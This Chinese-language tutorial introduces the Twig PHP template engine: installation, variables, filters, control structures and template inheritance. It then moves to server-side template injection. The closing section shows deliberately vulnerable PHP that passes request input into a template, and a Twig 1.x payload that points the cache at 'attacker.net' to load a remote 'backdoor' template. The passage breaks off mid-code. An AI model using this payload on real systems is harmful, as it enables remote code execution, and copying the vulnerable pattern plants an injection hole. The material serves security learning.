## Twig 简介
Twig 是一个灵活、快速、安全的 PHP 模板语言。它将模板编译成经过优化的原始 PHP 代码。Twig 拥有一个 Sandbox
模型来检测不可信的模板代码。Twig 由一个灵活的词法分析器和语法分析器组成，可以让开发人员定义自己的标签，过滤器并创建自己的 DSL。
> ### Twig is a modern template engine for PHP
>
>   * **Fast** : Twig _compiles_ templates down to plain optimized PHP code.
> The overhead compared to regular PHP code was reduced to the very minimum.
>   * **Secure** : Twig has a _sandbox_ mode to evaluate untrusted template
> code. This allows Twig to be used as a template language for applications
> where users may modify the template design.
>   * **Flexible** : Twig is powered by a flexible _lexer_ and _parser_. This
> allows the developer to define its own custom tags and filters, and create
> its own DSL.
>
Twig 被许多开源项目使用，比如 Symfony、Drupal8、eZPublish、phpBB、Matomo、OroCRM；许多框架也支持
Twig，比如 Slim、Yii、Laravel 和 Codeigniter 等等。
## Twig 的安装
  * 这里我们的 Twig 版本是 Twig 3.x，其需要的 PHP 版本为 PHP 7.2.5。
建议通过 Composer 安装 Twig：
    composer require "twig/twig:^3.0"
安装之后可以直接使用 Twig 的 PHP API 进行调用：
    require_once __DIR__.'/vendor/autoload.php';
    $loader = new \Twig\Loader\ArrayLoader([
        'index' => 'Hello {{ name }}!',
    ]);
    $twig = new \Twig\Environment($loader);
    echo $twig->render('index', ['name' => 'whoami']);
上述代码中，Twig 首先使用一个加载器 `Twig_Loader_Array` 来定位模板，然后使用一个环境变量 `Twig_Environment`
来存储配置信息。其中， `render()` 方法通过其第一个参数载入模板，并通过第二个参数中的变量来渲染模板。
由于模板文件通常存储在文件系统中，Twig 还附带了一个文件系统加载程序：
    require_once __DIR__.'/vendor/autoload.php';
    $loader = new \Twig\Loader\FilesystemLoader('./views');
    //$loader = new \Twig\Loader\FilesystemLoader('./templates');
    $twig = new \Twig\Environment($loader, [
        'cache' => './cache/views',    // cache for template files
    ]);
    echo $twig->render('index.html', ['name' => 'whoami']);
注意，如果你没有使用 Composer，从 [Github](https://github.com/twigphp/Twig/tags)
上下载最新的压缩包，然后像下面这样使用 Twig 的内置自动加载器：
    require_once __DIR__.'/vendor/twig/twig/lib/Twig/Autoloader.php';
     Twig_Autoloader::register();
## Twig 模板的基础语法
模板实际就是一个常规的文本文件，它可以生成任何基于文本的格式（HTML、XML、CSV、LaTeX等）。它没有特定的扩展名，`.html`、`.xml`、`.twig`
都行。
模板包含变量或表达，在评估编译模板时，这些带值的变量或表达式会被替换。还有一些控制模板逻辑的标签 tags。下面是一个非常简单的模板，它阐述了一些基础知识：
            My Webpage
            {% for item in navigation %}
                {{ item.caption }}
            {% endfor %}
            My Webpage
            {{ a_variable }}
有两种形式的分隔符：`{% ... %}` 和 `{{ ... }}`。前者用于执行语句，例如 `for` 循环，后者用于将表达式的结果输出到模板中。
### 变量
应用程序将变量传入模板中进行处理，变量可以包含你能访问的属性或元素。你可以使用 `.` 来访问变量中的属性（方法或 PHP 对象的属性，或 PHP
数组单元），也可以使用所谓的 "subscript" 语法 `[]`:
    {{ foo.bar }}
    {{ foo['bar'] }}
### 设置变量
可以为模板代码块内的变量赋值，赋值使用 [set](https://www.osgeo.cn/twig/tags/set.html) 标签：
    {% set foo = 'foo' %}
    {% set foo = [1, 2] %}
    {% set foo = {'foo': 'bar'} %}
### 过滤器
可以通过过滤器 filters 来修改模板中的变量。在过滤器中，变量与过滤器或多个过滤器之间使用 `|`
分隔，还可以在括号中加入可选参数。可以连接多个过滤器，一个过滤器的输出结果将用于下一个过滤器中。
下面这个过滤器的例子会剥去字符串变量 `name` 中的 HTML 标签，然后将其转化为大写字母开头的格式:
    {{ name|striptags|title }}
    // {{ 'whoami'|striptags|title }}
    // Output: Whoami!
下面这个过滤器将接收一个序列 `list`，然后使用 `join` 中指定的分隔符将序列中的项合并成一个字符串：
    {{ list|join }}
    {{ list|join(', ') }}
    // {{ ['a', 'b', 'c']|join }}
    // Output: abc
    // {{ ['a', 'b', 'c']|join('|') }}
    // Output: a|b|c
更多内置过滤器请参考：
### 函数
在 Twig 模板中可以直接调用函数，用于生产内容。如下调用了 `range()` 函数用来返回一个包含整数等差数列的列表：
    {% for i in range(0, 3) %}
        {{ i }},
    {% endfor %}
    // Output: 0, 1, 2, 3,
更多内置函数请参考：
### 控制结构
控制结构是指控制程序流程的所有控制语句 `if`、`elseif`、`else`、`for` 等，以及程序块等等。控制结构出现在 `{% ... %}`
块中。
例如使用 `for` 标签进行循环：
    Members
        {% for user in users %}
            {{ user.username|e }}
        {% endfor %}
`if` 标签可以用来测试表达式：
    {% if users|length > 0 %}
            {% for user in users %}
                {{ user.username|e }}
            {% endfor %}
    {% endif %}
更多 tags 请参考：
### 注释
要在模板中注释某一行，可以使用注释语法 `{# ...#}`：
    {# note: disabled template because we no longer use this
        {% for user in users %}
            ...
        {% endfor %}
    #}
### 引入其他模板
Twig 提供的 `include` 函数可以使你更方便地在模板中引入模板，并将该模板已渲染后的内容返回到当前模板：
    {{ include('sidebar.html') }}
### 模板继承
Twig 最强大的部分是模板继承。模板继承允许您构建一个基本的 "skeleton" 模板，该模板包含站点的所有公共元素，并定义子模版可以覆写的
blocks 块。
然后允许其他子模板集成并重写。
比如，我们先来定义一个基础的模板 base.html，它定义了一个基础的 HTML skeleton 文档：
            {% block head %}
                {% block title %}{% endblock %} - My Webpage
            {% endblock %}
            {% block content %}{% endblock %}
                {% block footer %}
                    &copy; Copyright 2011 by you.
                {% endblock %}
在这个例子中，`block` 标签定义了 4 个块，可以由子模版进行填充。对于模板引擎来说，所有的 `block` 标签都可以由子模版来覆写该部分。
子模版大概是这个样子的：
    {% extends "base.html" %}
    {% block title %}Index{% endblock %}
    {% block head %}
        {{ parent() }}
    {% endblock %}
    {% block content %}
        Index
            Welcome to my awesome homepage.
    {% endblock %}
其中的 `extends` 标签是关键所在，其必须是模板的第一个标签。 `extends`
标签告诉模板引擎当前模板扩展自另一个父模板，当模板引擎评估编译这个模板时，首先会定位到父模板。由于子模版未定义并重写 `footer`
块，就用来自父模板的值替代使用了。
更多 Twig 的语法请参考：
## Twig 模板注入
和其他的模板注入一样，Twig 模板注入也是发生在直接将用户输入作为模板，比如下面的代码：
    createTemplate("Hello {$_GET['name']}!");
    echo $template->render();
这里的代码中，`createTemplate` 时注入了
`$_GET['name']`，此时就会引发模板注入。而如下代码则不会，因为模板引擎解析的是字符串常量中的 `{{name}}`，而不是动态拼接的
`$_GET["name"]`：
     'Hello {{ name }}!',
    ]);
    $twig = new \Twig\Environment($loader);
    echo $twig->render('index', ['name' => 'whoami']);
而对于 Twig 模板注入利用，往往就是借助模板中的一些方法或过滤器实现攻击目的。下面我们分版本进行讲解。
### Twig 1.x
测试代码如下：
  * index.php
    render($_GET['name']);
    ?>
在 Twig 1.x 中存在三个全局变量：
  * `_self`：引用当前模板的实例。
  * `_context`：引用当前上下文。
  * `_charset`：引用当前字符集。
对应的代码是：
    protected $specialVars = [
            '_self' => '$this',
            '_context' => '$context',
            '_charset' => '$this->env->getCharset()',
        ];
这里主要就是利用 `_self` 变量，它会返回当前 `\Twig\Template` 实例，并提供了指向 `Twig_Environment` 的
`env` 属性，这样我们就可以继续调用 `Twig_Environment` 中的其他方法，从而进行 SSTI。
比如以下 Payload 可以调用 `setCache` 方法改变 Twig 加载 PHP 文件的路径，在 `allow_url_include`
开启的情况下我们可以通过改变路径实现远程文件包含：
    {{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
此外还有 `getFilter` 方法：
    public function getFilter($name)
      {
        ...
        foreach ($this->filterCallbacks as $callback) {